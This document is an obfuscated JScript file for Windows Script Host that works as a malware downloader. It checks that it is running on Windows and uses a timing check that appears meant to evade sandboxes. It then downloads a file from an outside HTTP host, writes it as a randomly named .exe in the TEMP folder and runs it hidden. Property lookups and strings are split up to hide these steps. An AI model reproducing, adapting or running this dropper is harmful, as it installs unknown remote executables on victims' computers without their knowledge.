var z0 = false;
var pP = "CreateObject";
var N = function F() {return WScript[pP]("WScript.Shell");}(), j = 11;
var I = "MSXML2.XMLHTTP";
var C = 2123213;
var h0 = 0;
function w(PR){N["Run"](PR, h0, h0);};
function gV(){return "" + I;};
function k(nw, I0){h0 = h0 * 1; return nw - I0;};
function D(){return pP;};
/*@cc_on
  @if (@_win32 || @_win64)
    z0 = true;
  @end
@*/
if (z0)
{
var R = "";
function hx(){return 22;};
var o = 0; var yh = 0;
function qv()
{
var K = new this["Date"]();
var s0 = K["getUTCMilliseconds"]();
WScript["Sleep"](hx());
var K = new this["Date"]();
var s = K["getUTCMilliseconds"]();
WScript["Sleep"](hx());
var K = new this["Date"]();
var zT = K["getUTCMilliseconds"]();
var o = "fc";
o = k(s, s0);
var yh = "bQ";
yh = k(zT, s);
R = "open";
return k(o, yh);
}
var t0 = false;
var kb = false;
for (var H = h0; H < hx() * 1; H++){if (qv() != h0){
t0 = true; 
yh = "31" + 11 * o + yh; 
kb = true; 
break;
}}
function A() {return ((t0 == true) && (t0 == kb)) ? 1 : h0;};
if (t0 && A() && kb){
function T() {return N["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UXy7MZEaOLIgC.exe";};
 fs = gV();
 Rg = WScript[pP](fs);
 var pf = 1;
 while (pf){
try {
Rg[R]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
Rg["send"]();
JX = "Sleep";
for (;;){WScript[JX](hx() * 11); if (Rg["readystate"] >= 2 * 2) break;};
pf = h0;
} catch(WI){};
}
function g(z) {var t = (1, 2, 3, 4, 5, z); return t;};
u = WScript[D()]("ADODB.Stream");
fs = u;
fs[R]();
fs["type"] = g(1);
fs["write"](Rg["ResponseBody"]);
u["position"] = g(h0);
fs["Save" + "ToFile"](T(), 2);
u["c"+"lose"]();
h = T();
w(h);
}
}

